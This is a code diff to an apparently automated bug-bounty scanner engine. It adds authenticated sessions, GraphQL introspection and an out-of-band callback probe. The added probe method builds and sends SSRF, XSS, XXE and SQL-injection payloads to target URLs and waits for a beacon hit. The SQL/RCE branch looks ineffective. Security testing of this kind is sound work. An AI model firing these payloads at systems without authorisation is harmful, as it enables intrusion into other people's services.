@@ -28,6 +28,10 @@ import { metaReasoner } from "../lib/intelligence/meta-reasoning";
 import { backwardPlanner } from "../lib/intelligence/backward-planner";
 import { observationCompressor } from "../lib/intelligence/observation-compressor";
 import { nvdClient } from "../lib/intelligence/nvd-client";
+import { sessionManager, AuthConfig } from "../lib/tools/session-manager";
+import { callbackServer } from "../lib/oob/callback-server";
+import { graphqlProber } from "../lib/tools/graphql-probe";
+import { programs } from "../db/schema";
 
 const execFileAsync = promisify(execFile);
 
@@ -275,6 +279,8 @@ export class HunterEngine extends EventEmitter {
   private hardBanned = false;
   private consecutiveFailures = 0;
   private banCheckDone = false;
+  private authHeaders: Record<string, string> = {};
+  private authConfig: AuthConfig | null = null;
 
   async startHunt(params: {
     targetUrl: string;
@@ -334,6 +340,20 @@ export class HunterEngine extends EventEmitter {
           createdAt: Date.now(),
         });
       }
+    }
+
+    // Load auth config for this program and establish session if configured
+    try {
+      const [prog] = await db.select({ authConfig: programs.authConfig })
+        .from(programs).where(eq(programs.id, params.programId)).limit(1);
+      if (prog?.authConfig) {
+        this.authConfig = prog.authConfig as AuthConfig;
+        const session = await sessionManager.login(params.programId, this.authConfig);
+        this.authHeaders = session.headers;
+        logger.info("[HunterEngine] Authenticated session established", { programId: params.programId });
+      }
+    } catch (err) {
+      logger.warn("[HunterEngine] Auth setup failed — continuing unauthenticated", { err: String(err) });
     }
 
     this.rlWiring.onHuntStart({
@@ -517,6 +537,48 @@ export class HunterEngine extends EventEmitter {
       await this.seedCVEHypotheses(techObs).catch(err =>
         logger.warn("[HunterEngine] CVE seeding failed (non-critical)", { err: String(err) })
       );
+      // GraphQL probing — detect and introspect any GraphQL endpoints
+      await this.probeGraphQL().catch(err =>
+        logger.warn("[HunterEngine] GraphQL probing failed (non-critical)", { err: String(err) })
+      );
+    }
+  }
+
+  private async probeGraphQL(): Promise<void> {
+    const endpoints = await graphqlProber.detectEndpoints(this.state.targetUrl, this.authHeaders);
+    if (!endpoints.length) return;
+
+    for (const ep of endpoints) {
+      const schema = await graphqlProber.introspect(ep, this.authHeaders);
+      if (!schema) continue;
+
+      const seeds = graphqlProber.toHypothesisSeeds(schema);
+      for (const seed of seeds) {
+        this.state.hypotheses.push({
+          id: uuidv4(),
+          vulnClass: seed.vulnClass,
+          targetUrl: seed.targetUrl,
+          reasoning: seed.reasoning,
+          confidence: seed.confidence,
+          priority: seed.priority,
+          evidence: [],
+          status: "pending",
+          createdAt: Date.now(),
+        });
+      }
+
+      this.emit("hunt:graphql_schema", {
+        sessionId: this.state.sessionId,
+        endpoint: ep,
+        typeCount: schema.typeCount,
+        injectableCount: schema.injectableArgs.length,
+      });
+      logger.info("[HunterEngine] GraphQL schema mapped", { endpoint: ep, typeCount: schema.typeCount });
+
+      if (this.state.hypotheses.length > MAX_HYPOTHESES) {
+        this.state.hypotheses.sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence));
+        this.state.hypotheses.splice(MAX_HYPOTHESES);
+      }
     }
   }
 
@@ -709,13 +771,20 @@ Return ONLY valid JSON array of hypothesis objects.`;
       delete hypothesis.toolHint; // consume the hint so it doesn't persist to future probes
       const probeResult = await this.runTool(toolName, hypothesis.targetUrl, hypothesis);
 
+      // OOB beacon probe for blind/async vuln classes that don't produce immediate signals
+      const oobClasses = ["ssrf", "xss", "sqli", "rce", "xxe"];
+      let oobHit = false;
+      if (oobClasses.includes(hypothesis.vulnClass) && !probeResult.found && !probeResult.injectable) {
+        oobHit = await this.runOOBProbe(hypothesis.targetUrl, hypothesis.vulnClass);
+      }
+
       const result: ProbeResult = {
         hypothesisId: hypothesis.id,
         tool: toolName,
         command: String(probeResult.command || ""),
-        output: String(probeResult.rawOutput || ""),
+        output: oobHit ? `OOB callback received — ${hypothesis.vulnClass} confirmed` : String(probeResult.rawOutput || ""),
         parsed: probeResult,
-        success: Boolean(probeResult.found || probeResult.injectable || probeResult.count),
+        success: Boolean(probeResult.found || probeResult.injectable || probeResult.count || oobHit),
         duration: Number(probeResult.duration || 0),
       };
 
@@ -939,6 +1008,50 @@ Return ONLY valid JSON array of hypothesis objects.`;
     const currentTool = this.selectTool(hypothesis.vulnClass);
     const currentIdx = rotation.indexOf(currentTool);
     return rotation[(currentIdx + 1) % rotation.length];
+  }
+
+  private async runOOBProbe(targetUrl: string, vulnClass: string): Promise<boolean> {
+    try {
+      const { beaconId, callbackUrl } = callbackServer.generateBeacon();
+
+      // Inject callback URL as payload based on vuln class
+      const probeUrl = (() => {
+        const u = new URL(targetUrl);
+        if (vulnClass === "ssrf") {
+          // Append callback URL as common SSRF parameter names
+          u.searchParams.set("url", callbackUrl);
+          return u.toString();
+        }
+        if (vulnClass === "xss") {
+          u.searchParams.set("q", `<img src="${callbackUrl}">`);
+          return u.toString();
+        }
+        if (vulnClass === "xxe") {
+          u.searchParams.set("xml", `<!DOCTYPE x [<!ENTITY oob SYSTEM "${callbackUrl}">]><x>&oob;</x>`);
+          return u.toString();
+        }
+        // sqli/rce: fire a secondary DNS-style probe as a GET request
+        u.searchParams.set("id", `1 OR 1=1-- ${callbackUrl}`);
+        return u.toString();
+      })();
+
+      await axios.get(probeUrl, {
+        headers: this.authHeaders,
+        timeout: 8000,
+        validateStatus: () => true,
+      }).catch(() => {});
+
+      const hit = await callbackServer.waitForHit(beaconId, 12_000);
+      if (hit) {
+        this.emit("hunt:oob_hit", { sessionId: this.state.sessionId, beaconId, vulnClass, targetUrl });
+        logger.info("[HunterEngine] OOB callback confirmed", { beaconId, vulnClass, targetUrl });
+      }
+      callbackServer.cleanup(beaconId);
+      return hit;
+    } catch (err) {
+      logger.debug("[HunterEngine] OOB probe error (non-critical)", { err: String(err) });
+      return false;
+    }
   }
 
   private computeAnomalyScore(data: Record<string, unknown>): number {
